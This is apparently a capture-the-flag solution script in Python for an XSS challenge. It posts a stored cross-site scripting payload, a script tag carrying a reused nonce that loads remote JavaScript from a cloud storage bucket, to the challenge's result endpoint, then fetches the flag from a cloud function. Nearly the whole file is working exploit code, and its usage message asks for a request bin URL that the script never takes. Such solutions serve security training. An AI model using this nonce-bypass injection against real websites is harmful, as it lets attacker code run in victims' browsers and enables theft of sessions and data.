import sys
import requests 

cloudUrl = "https://us-west1-corgi-test.cloudfunctions.net"
payloadUrl = "https://storage.googleapis.com/corgi-payload/payload.js"
payload= "<script src='" + payloadUrl + "' nonce='corgi'></script>"

if len(sys.argv) != 2:
    print("Please specify challenge URL and request bin URL")
    print("python solution.py <challenge-url>")
else:  
	vector = payload
	param = {'payload':vector}
	response = requests.post(sys.argv[1] + '/xss-three-result', data=param)
	print("Response as non-Admin")
	print(response.text)
	print("Response as Admin")
	response = requests.get(cloudUrl +'/print-flag')
	print(response.text)
